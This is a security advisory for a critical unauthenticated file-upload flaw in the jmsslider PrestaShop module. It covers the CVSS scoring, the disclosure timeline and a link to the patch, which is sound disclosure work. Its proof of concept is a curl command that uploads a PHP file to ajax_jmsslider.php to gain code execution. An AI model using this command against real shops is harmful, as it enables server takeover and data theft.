---
layout: post
title: "Unrestricted upload vulnerability in Jms Slider (jmsslider) PrestaShop module"
categories: modules
author:
- Creabilis.com
- TouchWeb.fr
- Friends-Of-Presta.org
meta: "CVE,PrestaShop"
severity: "critical (9.8)"
---

The module Jms Slider (jmsslider) from Joommasters contains an unrestricted upload of file with dangerous type vulnerability.
This module is for the PrestaShop e-commerce platform and mainly provided with joo masters PrestaShop themes

## Summary

* **CVE ID**: Awaiting from MITRE.org
* **Published at**: 2023-03-13
* **Advisory source**: Joomasters
* **Vendor**: PrestaShop
* **Product**: jmsslider
* **Impacted release**: at least 1.6.0
* **Product author**: Joommasters
* **Weakness**: [CWE-434](https://cwe.mitre.org/data/definitions/434.html)
* **Severity**: critical (9.8)

## Description

ajax_jmsslider.php can be called anonymously to upload a php file that can be used for RCE.

## CVSS base metrics

* **Attack vector**: network
* **Attack complexity**: low
* **Privilege required**: none
* **User interaction**: none
* **Scope**: unchanged
* **Confidentiality**: high
* **Integrity**: high
* **Availability**: high

**Vector string**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Possible malicious usage

* Obtain admin access
* Remove data on the associated PrestaShop
* Steal datas

## Proof of concept

```bash
curl -v -F "data_image=@test.php" "https://preprod.XXX/modules/jmsslider/ajax_jmsslider.php?secure_key=VALUE_AVAILABLE_ON_FRONTOFFICE&action=addLayer&data_type=image&id_slide=99999"
```

## Patch
Provided by the editor
https://www.joommasters.com/index.php/blog/tutorials-and-case-studies/how-to-fix-security-bug-of-slider-security-breach-of-theme.html

## Timeline

| Date | Action |
|--|--|
| 2019-09-04 | Vulnerability publish by the editor |
| 2023-02-17 | Contact the author |
| 2023-03-13 | Publish this security advisory |

## Other recommandations

None

## Links

* [Joom masters web site](https://www.joommasters.com/)
* [Joom masters blog post on the vulnerability](https://www.joommasters.com/index.php/blog/tutorials-and-case-studies/how-to-fix-security-bug-of-slider-security-breach-of-theme.html)
